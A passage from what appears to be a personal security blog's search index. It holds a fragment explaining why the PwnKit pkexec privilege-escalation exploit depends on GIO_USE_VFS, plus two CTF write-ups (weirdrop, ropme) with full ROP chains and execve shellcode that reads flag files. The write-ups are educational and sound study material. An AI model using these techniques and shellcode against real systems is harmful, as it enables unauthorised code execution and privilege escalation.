\u0026#34;UTF-8\u0026#34;) -h Display this message What\u0026rsquo;s the deal with GIO_USE_VFS?! I saw a few people on social media ask why does the exploit fail if the GIO_USE_VFS= is not defined? Why does it work with the older versions?\nThe culprit daf3d5c2d15466a267221fcb099c59c870098e03 is the culprit. Here\u0026rsquo;s the relevant part of the diff:\n--- a/src/programs/pkexec.c +++ b/src/programs/pkexec.c @@ -503,6 +503,9 @@ main (int argc, char *argv[]) opt_user = NULL; local_agent_handle = NULL; + /* Disable remote file access from GIO. */ + setenv (\u0026#34;GIO_USE_VFS\u0026#34;, \u0026#34;local\u0026#34;, 1); + /* check for correct invocation */ if (geteuid () != 0) { Versions prior to this commit are exploitable without the need to define the GIO_USE_VFS variable. The purpose of the commit is actually a red herring. It\u0026rsquo;s not the variable means, it\u0026rsquo;s how it affects the environment. For the truth we must look to libc.\nLooking in libc The process\u0026rsquo;s environment in libc is represented by an array of char *s, pointed to by this global variable:\nchar **environ; environ lives on the heap and is occasionally relocated. You might already know where this is going. Check out this code snippet from setenv.c :\n#if !_LIBC # define __environ environ # ifndef HAVE_ENVIRON_DECL extern char **environ; # endif #endif int __add_to_environ (const char *name, const char *value, const char *combined, int replace) { char **ep; // ... skipping ep = __environ; size = 0; if (ep != NULL) { for (; *ep != NULL; ++ep) if (!strncmp (*ep, name, namelen) \u0026amp;\u0026amp; (*ep)[namelen] == \u0026#39;=\u0026#39;) break; else ++size; } if (ep == NULL || __builtin_expect (*ep == NULL, 1)) { char **new_environ; /* We allocated this space; we can extend it. */ new_environ = (char **) realloc (last_environ, (size + 2) * sizeof (char *)); // ... skipping last_environ = __environ = new_environ; } __add_to_environ is called by both setenv(3) and putenv(3) to accomplish the same thing: set an environment variable. If the environment variable in question is not defined, environ has to be reallocated to accomodate a new entry (a pointer to the new environment key=value pair). If it is defined, the size of the environ array has not changed and thus there is no reason for reallocation. For brevity I\u0026rsquo;ve omitted that part of the code - I encourage you to check it out.\nTying it all together Now let\u0026rsquo;s come back to the exploit. If you\u0026rsquo;ve gotten this far, you probably already know the methodology behind this exploit (if not please check out the original report ). We are trying to sneak in an environment variable by passing an empty program arguments (argv) to pkexec. When argc is truly empty (not even a program name), the environment variables, which are adjacent to arguments clash with it. We abuse this behavior to force pkexec to write a canonical path of a target executable. Howver, before we get this part of code we get this:\nsetenv (\u0026#34;GIO_USE_VFS\u0026#34;, \u0026#34;local\u0026#34;, 1); If this variable is not present in the environment environ will be reallocated and it will never end up clashing with argv and the out of bounds write will never take place.\n", 
        "url": "http:\/\/localhost:1313\/posts\/pwnkit\/"
    },
    
    "http:\/\/localhost:1313\/tags\/exploit\/": {
        "title": "Exploit",
        "tags": [],
        "content": "", 
        "url": "http:\/\/localhost:1313\/tags\/exploit\/"
    },
    
    "http:\/\/localhost:1313\/tags\/libc\/": {
        "title": "Libc",
        "tags": [],
        "content": "", 
        "url": "http:\/\/localhost:1313\/tags\/libc\/"
    },
    
    "http:\/\/localhost:1313\/tags\/lpe\/": {
        "title": "LPE",
        "tags": [],
        "content": "", 
        "url": "http:\/\/localhost:1313\/tags\/lpe\/"
    },
    
    "http:\/\/localhost:1313\/tags\/polkit\/": {
        "title": "Polkit",
        "tags": [],
        "content": "", 
        "url": "http:\/\/localhost:1313\/tags\/polkit\/"
    },
    
    "http:\/\/localhost:1313\/tags\/pwnkit\/": {
        "title": "PwnKit",
        "tags": [],
        "content": "", 
        "url": "http:\/\/localhost:1313\/tags\/pwnkit\/"
    },
    
    "http:\/\/localhost:1313\/posts\/weirdrop\/": {
        "title": "CircleCityCon 2021: weirdrop",
        "tags": ["CTF","ROP","pwn","linux",],
        "content": "I didn\u0026rsquo;t participate in the CTF, but I noticed that there is no writeup for this challenge, so I decided to address that. :D You can find the exploit source here .\nExploitable Service We get an exploitable service binary.\n[joey@gibson] file weird-rop weird-rop: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, BuildID[sha1]=2876651ce7257d4153ee90b05f0b1a2b29f25700, not stripped Neato! We got a 64-bit ELF. The binary is statically compiled and not stripped, making reversing and exploitation much easier for us.\nReversing Turns out there isn\u0026rsquo;t much to reverse! This is a very lightweight binary, written in assembly. Here\u0026rsquo;s the program entry:\n┌ 21: entry0 (); │ 0x00401154 e887ffffff call loc.vuln │ 0x00401159 48c7c03c0000. mov rax, 0x3c │ 0x00401160 48c7c7000000. mov rdi, 0 └ 0x00401167 0f05 syscall So far so good - the program calls vuln() then calls the exit system call with the exit code 0. If you are looking for an easy reference for the ABI bookmark this .\nLet\u0026rsquo;s take a look at vuln():\n│ 0x004010e0 55 push rbp │ 0x004010e1 4889e5 mov rbp, rsp │ 0x004010e4 4883ec10 sub rsp, 0x10 │ 0x004010e8 48c7c0020000. mov rax, 2 │ 0x004010ef 488d3c250020. lea rdi, loc.flag ; 0x402000 ; \u0026#34;/flag.txt\u0026#34; │ 0x004010f7 48c7c6020000. mov rsi, 2 │ 0x004010fe 48c7c2000000. mov rdx, 0 │ 0x00401105 0f05 syscall So far we got open(\u0026quot;/flag.txt\u0026quot;, O_RDWR). Note that this binary isn\u0026rsquo;t actually using libc, I\u0026rsquo;m just using libc functions to make the reversed code easier to look at. You can find the definitions of flags like O_RDWR in /usr/include (e.g. /usr/include/asm-generic/fcntl.h).\n│ 0x00401107 4883c030 add rax, 0x30 │ 0x0040110b 880424 mov byte [rsp], al │ 0x0040110e c64424010a mov byte [var_1h], 0xa │ 0x00401113 48c7c0010000. mov rax, 1 │ 0x0040111a 48c7c7010000. mov rdi, 1 │ 0x00401121 4889e6 mov rsi, rsp │ 0x00401124 48c7c2020000. mov rdx, 2 │ 0x0040112b 0f05 syscall At this point the rax register holds the file descriptor returned by the open syscall. The program adds 0x30 to the file descriptor, which is a low-tech way of turning a digit into its ASCII representation (0x30 represents zero and so on). We store this value on the stack and append \\n to it. The program then outputs this number to the standard output: write(STDOUT_FILENO, stack_pointer, 2);\n│ 0x0040112d 48c7c0000000. mov rax, 0 │ 0x00401134 48c7c7000000. mov rdi, 0 │ 0x0040113b 4889e6 mov rsi, rsp │ 0x0040113e 48c7c2c80000. mov rdx, 0xc8 │ 0x00401145 0f05 syscall │ 0x00401147 48c7c7000000. mov rdi, 0 │ 0x0040114e 4883c410 add rsp, 0x10 │ 0x00401152 5d pop rbp └ 0x00401153 c3 ret Reverses to this: read(STDOUT_FILENO, stack_ptr, 200);\nThe final chunk of this function reads 0xc8 bytes into the stack, nulls out the rdi register, does some cleanup, and returns. Obviously this is the vulnerability - we can overwrite the return address on the stack and gain control of the program counter.\nYucky Gadgets Okay so.. what\u0026rsquo;s the problem? Just hunt for some useful gadgets and get that easy 300 points right? Let\u0026rsquo;s see here\u0026hellip;\n0x00401000 5e pop rsi 0x00401001 c3 ret 0x00401002 48c7c000000000 mov rax, 0 0x00401009 c3 ret Cool cool.\n0x0040100a 48c7c001000000 mov rax, 1 0x00401011 c3 ret 0x004010db 0f05 syscall 0x004010dd c3 ret Nice!\n0x0040109b 4881f7cd030000 xor rdi, 0x3cd 0x004010a2 c3 ret 0x004010d3 4881f79a020000 xor rdi, 0x29a 0x004010da c3 ret Uhm\u0026hellip;\n0x004010cb 4881f7a3010000 xor rdi, 0x1a3 0x004010d2 c3 ret 0x004010c3 4881f798010000 xor rdi, 0x198 0x004010ca c3 ret \u0026hellip; okay?\n26 xor rdi gadgets?! Gross.\nExploitation Plan The exploitation plan I chose was to take advantage of the open file descriptor, telegraphed to us by the service, read the contents of the flag file, and simply write it to the standard output.\nMost gadgets are already obvious - we can load 1 and 0 into rax for the write and read system calls respectively. We even have a gadget to load the standard output file descriptor (1) into rdi.\nHowever we still need to put the flag file descriptor in rdi and there is no clear gadget candidate for this. We just got a bunch of awkward XOR gadgets and that means it\u0026rsquo;s time for some XOR math!\nI don\u0026rsquo;t know about you, but I\u0026rsquo;m pretty lazy, so I just wrote a Python script to bruteforce the needed XOR gadgets. (Note that since the rdi register is nulled out, the first XOR gadget will just put the immediate value into the register). The script permutes over every possible combination of XOR gadgets and breaks when the value is found. permute.py is the script I wrote for this task. Take a look - nothing too fancy there.\nThe flag file descriptor is always 5, so we can just run permute.py once to figure out the gadgets we need.\nIf you are confused by the file descriptor being 5 and not 3 you are not alone - it\u0026rsquo;s weird. This is likely due to a little bit more code on the server side that we don\u0026rsquo;t get to see. (I think the challenge would have been more interesting if the file descriptor was somewhat random. That way, we\u0026rsquo;d have to dynamically determine which gadgets to use).\n[joey@gibson]$ ./permute.py 5 0x56 0x53 Great - so the XOR gadgets that have these two operands is what we need. We now have all of the key elements of our exploit. This is the ROP chain I came up with:\n#define EXPLOIT_LEN 0xc8 uint8_t exploit[EXPLOIT_LEN] = { 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, // it\u0026#39;s in your head! 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, // it\u0026#39;s in your head! 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, // filler! 0x7c, 0x10, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00, // xor rdi, 0x53 0x1a, 0x10, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00, // xor rdi, 0x56 0xde, 0x10, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00, // pop rdx 0x19, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // length value 0x02, 0x10, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00, // mov rax, 0x0 0xdb, 0x10, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00, // syscall 0x0a, 0x10, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00, // mov rax, 0x1 0x12, 0x10, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00, // mov rdi, 0x1 0xdb, 0x10, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00, // syscall 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // ... 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, }; First 24 bytes are the filler for the stack - recall that the function subtracts 0x10 from the stack pointer and pops a register. The first two gadets are the XOR gadgets we\u0026rsquo;ve determined with permute.py. The next gadget pops 0x19 into rdx, which is the length of our read. Finally, we shove the read syscall number into rax and call it. Then we simply use the gadgets to load the write syscall number and place stdout file decriptor (1) as its first argument. The other two arguments in registers rsi and rdx remain the same throughout the exploit. That\u0026rsquo;s it!\n[joey@gibson]$ ./exploit CCC{math_is_hard_1234897} ", 
        "url": "http:\/\/localhost:1313\/posts\/weirdrop\/"
    },
    
    "http:\/\/localhost:1313\/tags\/ctf\/": {
        "title": "CTF",
        "tags": [],
        "content": "", 
        "url": "http:\/\/localhost:1313\/tags\/ctf\/"
    },
    
    "http:\/\/localhost:1313\/tags\/pwn\/": {
        "title": "Pwn",
        "tags": [],
        "content": "", 
        "url": "http:\/\/localhost:1313\/tags\/pwn\/"
    },
    
    "http:\/\/localhost:1313\/tags\/rop\/": {
        "title": "ROP",
        "tags": [],
        "content": "", 
        "url": "http:\/\/localhost:1313\/tags\/rop\/"
    },
    
    "http:\/\/localhost:1313\/posts\/ropme\/": {
        "title": "BSIDES SF 2021: ropme",
        "tags": ["CTF","ROP","pwn","linux",],
        "content": "I didn\u0026rsquo;t really participate in the ctf, but I found this challenge to be interesting and since not many teams solved it/posted writeups I decided to post my solution. It\u0026rsquo;s probably not the most elegant - if you solved it in a different way I\u0026rsquo;d love to hear about it. The exploit source can be found here. In this writeup, I\u0026rsquo;m assuming you have a basic understanding of x86 architecture, return oriented programming, and the Linux API.\nExploitable Service We\u0026rsquo;re given a service binary and its source code.\n[joey@gibson]$ file ropme ropme: ELF 32-bit LSB pie executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=b82649cdb66e4b3f92ea5fd28e374b5793cb9f26, not stripped The target binary is a 32-bit ELF. This will be useful when we are writing our exploit. Let\u0026rsquo;s take a look at the important parts of the source code.\n// Generate a random block of +rwx memory that\u0026#39;ll be filled randomly uint32_t *random_code = mmap((void*)CODE_START, CODE_LENGTH, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_ANONYMOUS | MAP_PRIVATE, 0, 0); // Allocate memory for the user to send us a stack - it\u0026#39;s just +rw uint8_t *stack = mmap((void*)STACK_START, STACK_LENGTH, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_PRIVATE, 0, 0); ... alarm(TIME); // Set the randomness in stone at the outset time_t t = time(NULL); // Immediately let the user know how much time they have printf(\u0026#34;The current time is: %ld\\n\u0026#34;, t); printf(\u0026#34;You have %d seconds to make this work\\n\u0026#34;, TIME); // Populate the random code block using a predictable RNG int i; srand(t); for(i = 0; i \u0026lt; CODE_LENGTH / 4; i++) { random_code[i] = rand(); } The service allocates two memory regions:\nrandom_code with read, write, and exec permissions at address CODE_START (0x13370000)\nstack with just read and write permissions and an address chosen by the system (STACK_LENGTH is NULL)\nThe program uses time(2) to generate the seed for pseudo-random number generation and conveniently tells the client what that seed is. It proceeds to fill random_code memory region with (you guessed it!) pseudo-random 32-bit numbers.\nFinally the service reads STACK_LENGTH bytes of user input into the stack region, uses asm(3) to clear all of the registers, set the stack pointer (esp) to the stack memory region and immediately ret\u0026rsquo;s.\nWhat\u0026rsquo;s going on here? Essentially, a contrived example of a stack overflow vulnerability, exploitable via Return Oriented Programming (ROP). Instead of writing a vulnerable program, the author of this challenge cut to the chase and generated an artificial stack for our exploit. The first thing that happens after we populate that stack is the ret operation, so we already control the instruction pointer (eip) with the first four bytes of our input.\nDumpster diving for gadgets We control eip but the only place we can reliably jump to is the random_code memory region, filled with junk. Lots of interesting things can be found in the junk!\nTurns out if you generate 0x500000 of pseudo-random bytes, some of those bytes will happen to be ROP gadgets. Remember that we are handed over the seed for pseudo-random number generation, which means we can recreate random_code locally (even if we weren\u0026rsquo;t given the seed - one second is a long time - we could call time(2) locally and get the same result).\nThe exploitation plan is straightforward - generate the same random memory that the service did and find the necessary gadgets for our ROP chain. There\u0026rsquo;s only one problem - our ROP gadgets can\u0026rsquo;t be too long. The longer the instruction the less chances we have of finding it in the randomly initialized memory.\nWhat happens if not all gadgets are present? We just try again! I wrapped my exploit with a shell script that kept trying until the exploit was successful. Through trial and error I found that we can find any two-byte gadget (including ret) with every attempt. A three-byte gadget already calls for some bruteforcing, so we must keep those to a minimum (my ROP chain ended up having two three-byte gadgets - I bet there\u0026rsquo;s a better solution out there).\nExploit methodology The goal of this challenge is to read the contents of /home/ctf/flag.txt. As is often the case with restricted exploitation environment, instead of attacking this problem head-on, we will modify the environment to make exploitation easier for us. We have full control over the stack, but it is set as non-executable. Our ROP chain will have to change the stack memory region permissions to executable. Then we simply jump into the stack and execute the second stage shellocde, which will read the flag for us.\nTo change permissions of a memory region, we utilize the mprotect(2) system call. If you\u0026rsquo;ve read the man page you know that mprotect might expect a page-aligned address and length. Since we don\u0026rsquo;t know the stack address, the first thing our ROP chain needs to do is grab the stack address from the stack pointer. As this is our first operation, esp will be pointing at stack+4, so we decrement ebx four times. Now we pop the rest of the arguments and the syscall number to the respective registers and run int 0x80 (remember we\u0026rsquo;re dealing with a 32-bit system).\nHere is the list of gadgets we\u0026rsquo;re looking for:\n; gadget 0 ; used to grab the stack address 89 e3 mov ebx, esp c3 ret ; gadget 1 ; used to page align the stack address 4b dec ebx c3 ret ; gadget 2 ; used for syscall parameter loading 58 pop eax c3 ret ; gadget 3 ; used for syscall parameter loading 59 pop ecx c3 ret ; gadget 4 ; used for syscall parameter loading 5a pop edx c3 ret ; gadget 5 ; everyone\u0026#39;s favorite interrupt cd 80 int 0x80 c3 ret ; gadget 6 ; jump to our second stage shellcode ff e4 jmp esp The stack layout will look like this:\n*((uint32_t *)(exploit+0)) = mov_ebx; // address of mov ebx, esp gadget *((uint32_t *)(exploit+4)) = dec_ebx; // address of dec ebx gadget *((uint32_t *)(exploit+8)) = dec_ebx; *((uint32_t *)(exploit+12)) = dec_ebx; *((uint32_t *)(exploit+16)) = dec_ebx; *((uint32_t *)(exploit+20)) = pop_eax; // address of pop eax gadget *((uint32_t *)(exploit+24)) = 125; // __NR_mprotect *((uint32_t *)(exploit+28)) = pop_ecx; // address of pop ecx gadget *((uint32_t *)(exploit+32)) = 4096; // page-aligned stack size *((uint32_t *)(exploit+36)) = pop_edx; // address of pop edx gadget *((uint32_t *)(exploit+40)) = (PROT_EXEC|PROT_WRITE|PROT_READ); *((uint32_t *)(exploit+44)) = int_80; // address of int 0x80 gadget *((uint32_t *)(exploit+48)) = jmp_esp; // address of jmp esp gadget Upon returning from mprotect we should be able to jump to esp. There\u0026rsquo;s a caveat. The calling convention uses the stack for arguments, but we\u0026rsquo;re already using the stack for our code. We need a new stack! Seems obvious, but I took that for granted and spent an hour wondering why my exploit was coring. Fortunately, we can just use random_code segment as our new stack. The first order of business in our second stage shellcode will be to move an address in random_code into esp. Besides that it\u0026rsquo;s just a vanilla execve shellcode that\u0026rsquo;s going to cat the flag.\n0xbc, 0x00, 0x00, 0x38, 0x13, // mov esp,0x133800000 ; new stack 0x6a, 0x0b, // push 0xb 0x58, // pop eax 0x31, 0xd2, // xor edx,edx 0x52, // push edx 0x68, 0x2f, 0x63, 0x61, 0x74, // push 0x7461632f 0x68, 0x2f, 0x62, 0x69, 0x6e, // push 0x6e69622f 0x89, 0xe3, // mov ebx,esp 0x68, 0x78, 0x74, 0x00, 0x00, // push 0x7478 0x68, 0x61, 0x67, 0x2e, 0x74, // push 0x742e6761 0x68, 0x66, 0x2f, 0x66, 0x6c, // push 0x6c662f66 0x68, 0x65, 0x2f, 0x63, 0x74, // push 0x74632f65 0x68, 0x2f, 0x68, 0x6f, 0x6d, // push 0x6d6f682f 0x89, 0xe1, // mov ecx,esp 0x52, // push edx 0x51, // push ecx 0x53, // push ebx 0x89, 0xe1, // mov ecx,esp 0xcd, 0x80, // int 0x80 0x6a, 0x01, // push 0x01 0x58, // pop eax 0x31, 0xdb, // xor ebx, ebx 0xcd, 0x80, // int 0x80 Let\u0026rsquo;s see the exploit in action:\n[joey@gibson]$ ./exploit === Generating random memory with seed 1615121940 ... =!!= Found EBX mov gadget @ 0x135e533c =!!= Found INT 0x80 gadget @ 0x1385c0c8 =-= All gadgets are present! Sending the exploit.. CTF{bounce_bounce_bounce} ", 
        "url": "http:\/\/localhost:1313\/posts\/ropme\/"
    },
    
    "http:\/\/localhost:1313\/categories\/": {
        "title": "Categories",
        "tags": [],
        "content": "", 
        "url": "http:\/\/localhost:1313\/categories\/"
    },
    
}
</script>
<script defer src="/js/lunr.js"></script>
<script defer src="/js/search.js"></script>

</footer>

</body>
</html>

